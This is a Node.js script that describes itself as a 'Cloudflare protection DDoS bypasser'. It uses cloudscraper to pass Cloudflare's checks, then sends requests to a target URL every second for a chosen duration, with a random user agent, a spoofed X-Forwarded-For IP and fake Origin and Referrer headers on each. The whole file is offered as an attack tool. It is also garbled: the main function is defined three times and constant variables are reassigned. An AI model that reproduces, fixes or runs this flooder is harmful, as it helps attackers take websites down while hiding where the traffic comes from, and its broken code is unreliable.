const cloudscraper = require('cloudscraper');
const request = require('request');
const randomstring = require('randomstring');
const cacheManager = require('cache-manager');
const httpStatusCodes = {
  OK: 200,
  BAD_REQUEST: 400,
  NOT_FOUND: 404,
  INTERNAL_SERVER: 500,
};
const bluebird = require('bluebird');

async function bypassCloudFlare(url, time) {
  const requests = bluebird.mapSeries([1, 2, 3, 4, 5, 6, 7, 8], async (i) => {
    const response = await cloudscraper.get(url);

    return response;
  });

  const responses = await requests;

  return responses;
}


const randomByte = () => Math.round(Math.random() * 256);

const cache = cacheManager.caching({
  store: 'memory',
  ttl: 60 * 1000, // 60 seconds
});
async function bypassCloudFlare(url, time) {
  const cachedResponse = await cache.get(url);

  if (cachedResponse) {
    return cachedResponse;
  }

  const response = await cloudscraper.get(url);

  await cache.set(url, response, { ttl: 60 * 1000 });

  return response;
}


const generateRandomIp = () => {
  return `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
};

const generateRandomUserAgent = () => {
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Tablet; rv:105.0.0.0) Gecko/105.0.0.0 Firefox/105.0.0.0',
    'Mozilla/5.0 (Windows Phone 10.0; Android 6.0; Xbox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36 Edge/16.16299',
    'Mozilla/5.0 (Macintosh; Apple M1 Mac OS X 13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
  ];

  return userAgents[Math.floor(Math.random() * userAgents.length)];
};

async function bypassCloudFlare(url, time) {
  const interval = setInterval(async () => {
    const cookie = '';
    const useragent = generateRandomUserAgent();

    const response = await cloudscraper.get(url);

    const parsed = JSON.parse(response.body);
    cookie = parsed['request']['headers']['cookie'];
    useragent = parsed['request']['headers']['User-Agent'];

    const rand = randomstring.generate({
      length: 10,
      charset: 'abcdefghijklmnopqrstuvwxyz0123456789',
    });

    const ip = generateRandomIp();

    const options = {
      url,
      headers: {
        'User-Agent': useragent,
        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        cookie,
        Origin: `http://${rand}.com`,
        Referrer: `http://google.com/${rand}`,
        'X-Forwarded-For': ip,
      },
    };

    function callback(error, response, body) {}

    request(options, callback);
  }, 1000);

  setTimeout(() => {
    clearInterval(interval);
  }, time * 1000);
}

if (process.argv.length <= 2) {
  console.log('\nCloudflare protection DDoS bypasser.\n');
  console.log('Usage: node CFBypass.js <url> <time>');
  console.log('Usage: node CFBypass.js <http(s)://example.com> ');
  process.exit(-1);
}

const url = process.argv[2];
const time = process.argv[3];

bypassCloudFlare(url, time);
